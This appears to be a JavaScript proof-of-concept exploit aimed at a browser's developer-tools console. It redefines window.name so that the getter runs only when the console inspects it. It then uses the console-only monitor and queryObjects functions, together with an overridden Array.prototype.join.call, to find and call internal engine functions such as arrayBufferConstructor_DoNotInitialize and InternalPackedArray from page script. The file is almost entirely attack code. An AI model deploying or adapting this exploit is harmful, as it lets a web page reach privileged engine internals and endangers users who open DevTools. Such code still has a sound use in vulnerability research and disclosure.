delete window.name;

Object.defineProperty(window, "name", {get: function () {
    // These two functions will only be in place if this function is being invoked
    // via the devtools console.
    if (typeof monitor !== "function" || typeof queryObjects !== "function") {
        return "";
    }

    // This causes the console to initialize the WeakMap that it manages.
    console.log(function () {});

    monitor(WeakMap.prototype.get);

    var stashedQueryObjects = queryObjects;

    setTimeout(() => {
        // At this point, the console should have initialized the WeakMap. The
        // monitor call placed above will ensure that when the result array is
        // looked up in the WeakMap, the monitoring will be triggered.
        stashedQueryObjects(Object);
    }, 1000);

    return "";
}});

// This will be called when the monitor function needs to display output results.
// The arguments passed in will be the arguments passed to the function being
// monitored.
window.Array.prototype.join.call = function (thisArg, ...argArray) {
    Array.from(thisArg).forEach(item => {
        if (Array.isArray(item)) {
            findInternalObjects(item);
        }
    });

    return window.Array.prototype.join.apply(thisArg, argArray);
};

function findInternalObjects(array) {
    var ab = findInternalObject(array, "arrayBufferConstructor_DoNotInitialize");

    if (ab) {
        console.log("Found arrayBufferConstructor_DoNotInitialize:");
        console.log(ab(100));
    }

    var ipa = findInternalObject(array, "InternalPackedArray");

    if (ipa) {
        console.log("Found InternalPackedArray:");
        console.log(ipa());
    }
}

function findInternalObject(array, name) {
    var internalObj = array.find(function (element) {
        if (typeof element === "function"
        && element.name === name) {
            return true;
        }

        return false;
    });

    return internalObj;
}